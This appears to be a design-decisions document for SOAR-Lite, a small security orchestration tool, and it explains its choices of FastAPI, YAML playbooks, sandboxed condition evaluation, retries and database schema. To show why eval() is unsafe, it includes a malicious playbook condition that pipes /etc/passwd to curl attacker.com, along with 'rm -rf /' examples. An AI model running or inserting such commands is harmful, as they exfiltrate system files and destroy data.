# SOAR-Lite Design Decisions

This document captures the key architectural decisions made during SOAR-Lite development, the reasoning behind them, and the trade-offs considered.

## Decision 1: Build Complete System vs MVP

**Decision:** Build complete system with all 5 connectors (VirusTotal, AbuseIPDB, Shodan, Slack, MockJira) rather than MVP with 3 connectors.

**Rationale:**
- Demonstrates connector extensibility from day 1
- Showcases real-world integration patterns
- Validates architecture under diverse connector implementations
- Portfolio impact: Shows full-stack capabilities

**Trade-off:**
- More initial development time
- More API keys required for testing
- Complexity validation becomes required

**Validation:**
- All 5 connectors tested separately
- Registry pattern allows unlimited future connectors
- No hardcoding of specific connectors in executor

---

## Decision 2: Python + FastAPI + SQLAlchemy

**Decision:** Synchronous REST API wrapper around async orchestration engine.

**Rationale:**
- FastAPI: Modern, fast, built-in async support, auto-generated OpenAPI docs
- SQLAlchemy: ORM with async support, DB-agnostic (SQLite → PostgreSQL)
- Python: Rapid development, rich security/SIEM library ecosystem
- Async core: Non-blocking for I/O-intensive connector calls

**Alternatives Considered:**

| Technology | Pros | Cons | Decision |
|-----------|------|------|----------|
| **FastAPI** (chosen) | Modern, async, fast | Newer ecosystem | ✅ Best for SOAR |
| Django REST | Mature, batteries-included | Sync-by-default, heavy | ❌ Overkill for this use case |
| Node.js + Express | Event-driven, natural async | Less SIEM integrations | ❌ Python dominates SIEM space |
| Go | Fast, concurrent | Manual async/retry logic | ❌ Prototyping speed matters |

**Rationale for FastAPI:**
```python
# Async by default for connector calls
async def execute_connector(connector: BaseConnector, params: dict):
    return await asyncio.wait_for(
        connector.execute(params),
        timeout=30
    )

# But REST endpoints accept sync requests (FastAPI handles internally)
@app.post("/alerts/")
async def ingest_alert(alert: Alert):
    # Background task (non-blocking)
    asyncio.create_task(execute_playbook(...))
    return {"status": "accepted"}
```

---

## Decision 3: YAML Playbooks (Not JSON, Not Python)

**Decision:** Single source of truth for orchestration logic is YAML files in `playbooks/` directory.

**Rationale:**

| Format | YAML | JSON | Python |
|--------|------|------|--------|
| **Comments** | ✅ Full support | ❌ None | ✅ Full support |
| **Readability** | ✅ High | ⚠️ Medium | ✅ High |
| **Security** | ✅ Safe | ✅ Safe | ❌ Dangerous (eval risk) |
| **Version control** | ✅ Excellent | ✅ Good | ⚠️ Code review required |
| **Non-tech users** | ✅ Accessible | ⚠️ Technical | ❌ Expert only |
| **Industry standard** | ✅ K8s, Splunk | ✅ APIs | ❌ Risky for configs |

**YAML Example:**
```yaml
# Phishing triage playbook - document incidents as we go
name: phishing_triage
trigger_alert_type: phishing
min_severity: medium
steps:
  # Step 1: Get IP reputation from VirusTotal
  - id: enrich_ip
    connector: virustotal
    input_field: source_ip
    timeout: 30          # Fail after 30 seconds
    retries: 3           # Retry 3 times with exponential backoff
    on_result:
      # If score > 70, this is a known malicious IP
      - if_expr: "score > 70"
        then: escalate   # Skip remaining steps, escalate to human
      # Otherwise, proceed to next step
      - if_expr: null
        then: continue
```

**Why NOT Python:**
```python
# DANGEROUS - Never do this!
def load_playbook(python_file):
    exec(open(python_file).read())  # Could execute: import os; os.system('rm -rf /')
```

**Why NOT JSON:**
```json
{
  "name": "phishing_triage",
  // Can't add comments explaining this playbook
  // JSON is for data, not configuration
}
```

---

## Decision 4: simpleeval for Condition Evaluation

**Decision:** Use `simpleeval.EvalWithCompoundTypes()` for ALL condition expressions in playbooks.

**Rationale:**

| Approach | Safety | Flexibility | Performance |
|----------|--------|-------------|-------------|
| **simpleeval (chosen)** | ✅ Sandboxed | ⚠️ Math/compare only | ✅ Fast |
| `eval()` | ❌ Arbitrary code execution | ✅ Full Python | ❌ Dangerous |
| Static conditions | ✅ Very safe | ❌ Limited | ✅ Very fast |
| YAML boolean only | ✅ Safe | ❌ Very limited | ✅ Fastest |

**Real Attack Vector:**
Malicious YAML playbook:
```yaml
on_result:
  - if_expr: "__import__('os').system('cat /etc/passwd | curl attacker.com')"
    then: escalate
```

**With eval() → PWNED**  
**With simpleeval() → Safely rejected**

**Code:**
```python
from simpleeval import EvalWithCompoundTypes

# SAFE: Only math/comparison allowed
safe_expr = "score > 70 and abuse_score < 50"
result = EvalWithCompoundTypes(safe_expr, names={"score": 85, "abuse_score": 12})
# result = True ✅

# DANGEROUS: Rejected by simpleeval
dangerous_expr = "__import__('os').system('rm -rf /')"
result = EvalWithCompoundTypes(dangerous_expr, names={})
# Raises: ForbiddenNode ✅
```

---

## Decision 5: Async/Await Throughout (No Thread Pool)

**Decision:** Native Python async/await with `httpx` async client, NOT thread-based concurrency.

**Rationale:**

| Concurrency | Throughput | Setup | GIL | Memory |
|-------------|-----------|-------|-----|--------|
| **Async/await (chosen)** | 50+ concurrent | Simple | N/A | 1MB/task |
| Thread pool | 50 threads fail | Complex | 🔒 Blocks | 8MB/thread |
| Process pool | 8 processes (CPU cores) | Very complex | ✅ None | 30MB/process |

**Incident execution is I/O-bound:**
- Wait for VirusTotal API: 200-500ms
- Wait for AbuseIPDB API: 100-300ms
- Wait for Shodan: 300-800ms

**Async code:**
```python
# Process 50 incidents concurrently without 50 threads
tasks = [
    execute_playbook(incident1),  # Incident 1 waiting on VirusTotal → Yield control
    execute_playbook(incident2),  # Can start Incident 2 while 1 waits
    execute_playbook(incident3),  # etc
]
results = await asyncio.gather(*tasks)
```

VS Thread pool (terrible):
```python
# Thread pool with 50 threads = 50 OS context switches = slow
# Plus: Thread-safety headaches, debugging nightmares, 400MB memory for threads alone
with ThreadPoolExecutor(max_workers=50) as pool:
    futures = [pool.submit(execute_playbook, incident) for incident in incidents]
    results = [f.result() for f in futures]
```

---

## Decision 6: Exponential Backoff Retry Strategy

**Decision:** 2^attempt second delays for connector failures (timeout, HTTP 5xx).

**Algorithm:**
```
Attempt 1 fails → Sleep 2^1 = 2 sec before retry
Attempt 2 fails → Sleep 2^2 = 4 sec before retry  
Attempt 3 fails → Sleep 2^3 = 8 sec before retry
Max: 3 attempts per step (configurable in YAML)
Total max wait: 2+4+8 = 14 seconds before escalation
```

**Rationale:**

| Strategy | Handles Rate Limits | Thundering Herd | Complexity |
|----------|-------------------|-----------------|------------|
| **Expo backoff (chosen)** | ✅ Yes (VirusTotal 4 req/min) | ✅ Distributed retry | ⚠️ Moderate |
| Fixed retry | ⚠️ Likely to hit again | ❌ Synchronized failure | ✅ Simple |
| Linear backoff | ✅ Maybe | ⚠️ Synchronized | ✅ Simple |
| No retry | ❌ Any hiccup = failure | N/A | ✅ Simplest |

**Real example: VirusTotal rate limits**
- Limit: 4 requests/minute = 15 seconds between requests
- With exponential backoff: Automatically backs off to 2-4 second delays, respects rate limits
- Without: Hammers API, gets 429, fails incident

---

## Decision 7: Registry Pattern for Connectors

**Decision:** Connectors registered at startup via `init_connectors()`, accessed via `get_connector(name)` in executor.

**Rationale:**

| Approach | New Connector | Testing | Refactoring |
|----------|--------------|---------|------------|
| **Registry (chosen)** | Edit registry, test new impl | Easy mock | No executor changes |
| Hardcoded if/elif | Add `elif connector == "virustal"` | Hard mock | Executor must change |
| Plugin system | Complex auto-discovery | Complex | Overkill for 5 connectors |

**Code:**
```python
# Executor: Zero knowledge of specific connectors
async def execute_step(step, alert):
    connector = get_connector(step.connector)  # Could be anything!
    result = await connector.execute(params)
    return result

# Adding new connector: Just register it
CONNECTOR_REGISTRY = {
    "virustotal": VirusTotalConnector(),
    "abuseipdb": AbuseIPDBConnector(),
    "shodan": ShodanConnector(),
    "slack": SlackConnector(),
    "mock_jira": MockJiraConnector(),
    # "my_new_connector": MyNewConnector(),  # Just add this line
}

# Testing: Mock the connector
with patch("soar.connectors.registry.get_connector") as mock_get:
    mock_get.return_value = MockConnector()  # Easy!
```

---

## Decision 8: Separate Tables (Incident / StepExecution / Metrics)

**Decision:** Three normalized tables instead of one large embedded JSON document.

**Rationale:**

| Structure | Storage | Query Speed | Reporting | Flexibility |
|-----------|---------|-------------|-----------|------------|
| **Normalized (chosen)** | ✅ Efficient | ✅ Fast | ✅ Easy | ✅ Good |
| Incident w/ embedded steps | ⚠️ Redundant | ⚠️ Slow | ⚠️ Hard | ❌ Poor |

**Example Query:**
```sql
-- "Show all incidents using phishing_triage that took > 30 seconds"
-- EASY with normalized tables:
SELECT i.id, i.alert_id, 
  EXTRACT(EPOCH FROM max(se.completed_at) - 
          min(se.started_at)) as duration_seconds
FROM incidents i
JOIN step_executions se ON i.id = se.incident_id
WHERE i.playbook_name = 'phishing_triage'
GROUP BY i.id
HAVING duration_seconds > 30;

-- HARD with embedded JSON:
SELECT COUNT(*) FROM incidents 
WHERE JSON_EXTRACT(steps_json, '$.duration') > 30;
-- Not even possible without JSON deserialize!
```

---

## Decision 9: SQLite MVP → PostgreSQL Production Path

**Decision:** Start with SQLite (file-based, no setup), swap to PostgreSQL for scaling.

**Rationale:**

| Feature | SQLite | PostgreSQL |
|---------|--------|-----------|
| **Setup** | ✅ Zero | ⚠️ Docker + credentials |
| **Concurrency** | ⚠️ File locks | ✅ True ACID |
| **Scale** | ❌ ~1GB incidents | ✅ Petabytes |
| **Dev/test** | ✅ Perfect | ⚠️ Overkill |

**Migration is trivial:**
```python
# Development
DATABASE_URL = "sqlite+aiosqlite:///./soar_lite.db"

# Staging
DATABASE_URL = "postgresql+asyncpg://user:pass@db-staging.internal:5432/soar"

# Production
DATABASE_URL = "postgresql+asyncpg://user:pass@db-prod.internal:5432/soar"

# Same code everywhere thanks to SQLAlchemy abstraction!
```

---

## Decision 10: State Machine Enforces Transitions

**Decision:** Explicit `validate_incident_transition()` prevents invalid state changes.

**Rationale:**

| Approach | Error Prevention | Debugging | Complexity |
|----------|-----------------|-----------|------------|
| **State machine (chosen)** | ✅ Compile-time check | ✅ Clear | ⚠️ Moderate |
| No validation | ❌ Runtime surprise | ❌ Confusing | ✅ Simple |
| Documentation only | ⚠️ Human error | ⚠️ Trust | ✅ Simple |

**Valid transitions:**
```
PENDING → RUNNING (start processing)
RUNNING → COMPLETED (all steps successful)
RUNNING → ESCALATED (human action needed)
RUNNING → FAILED (error occurred)
COMPLETED/FAILED/ESCALATED → (terminal, no change)
```

**Invalid, will throw error:**
```python
# This is impossible and should fail loudly:
validate_incident_transition(COMPLETED, RUNNING)
# Raises: StateTransitionError: "Invalid incident transition: completed → running. Allowed: []"
```

---

## Decision 11: Background Task Execution (Non-Blocking Response)

**Decision:** Return 202 Accepted immediately, execute playbook as background task.

**Rationale:**

| Approach | Response Time | User Experience | Scalability |
|----------|---------------|-----------------|------------|
| **Background (chosen)** | 10ms | Responsive | Excellent |
| Synchronous | 5-30 sec | Slow/timeout | Limited |

**Code:**
```python
@app.post("/alerts/")
async def ingest_alert(alert: Alert):
    incident = await create_incident(...)
    
    # Fire and forget (tracked in APP_STATE)
    task = asyncio.create_task(execute_playbook(incident))
    
    # Immediate response, playbook runs in background
    return {
        "status": "accepted",
        "incident_id": incident.id,
    }

# Client can poll:
# GET /incidents/{id} → check status periodically
```

---

## Decision 12: Utility Scoring Algorithm

**Decision:** `utility = successful_true_positives / total_with_verdict` (or 0.5 if insufficient data).

**Rationale:**

| Metric | Meaning | Use Case |
|--------|---------|----------|
| **Utility** | "Of the verdicted incidents, how many did this step help?" | Playbook optimization |
| Precision | TP / (TP + FP) | Detector accuracy |
| Recall | TP / (TP + FN) | Detection coverage |

**Why not Precision?**
- Precision = "Is this detector accurate?"
- But we don't know FP for incidents without verdict
- Utility = "Did this step contribute to real incident resolution?"

**Example:**
```
10 incidents through phishing_triage
  ↓
5 analyst verdicts: 4 true positive, 1 false positive
  ↓
VirusTotal step utility = 4 / 5 = 0.80 (80%)
AbuseIPDB step utility = 3 / 5 = 0.60 (60%)
MockJira step utility = 1 / 5 = 0.20 (20%) ← This step rarely helps!

Recommendation:
- VirusTotal (0.80): Keep ✅
- AbuseIPDB (0.60): Keep ✅
- MockJira (0.20): Review, maybe remove ⚠️
```

---

## Trade-offs Summary

| Decision | Benefit | Cost |
|----------|---------|------|
| Complete system (5 connectors) | Portfolio impact, real-world validation | More dev time |
| Python + FastAPI + async | Rapid dev, natural SIEM integrations | Different paradigm |
| YAML playbooks | Security, readability, version control | Need YAML validation |
| simpleeval conditions | Safe, deterministic | Limited expressions |
| Async/await | Efficient, scalable | Callback complexity |
| Exponential backoff | Rate limit respecting | Longer failure waits |
| Registry pattern | Extensible, testable | One more abstraction |
| Normalized schema | Query flexibility, efficiency | More joins |
| SQLite MVP | Zero setup, rapid testing | Not production ready |
| State machine | Error prevention | More validation code |
| Background tasks | Responsive API | Requires polling |
| Utility scoring | Playbook optimization | Needs analyst verdicts |

---

## Lessons Learned

1. **simpleeval is your friend** - Never eval() user YAML. Ever.
2. **Async is worth it** - I/O-bound applications (SOAR, webhooks, APIs) shine with async.
3. **Registry patterns scale** - Adding 6th connector required 1 line.
4. **State machines prevent bugs** - Impossible states caught at development time.
5. **Testing concurrent incidents** - Discovered resource issues early (async event loop scope).

---

**Last Updated:** April 1, 2026  
**Version:** 1.0  
**Next Decision:** Phase 7 WebSocket dashboard architecture
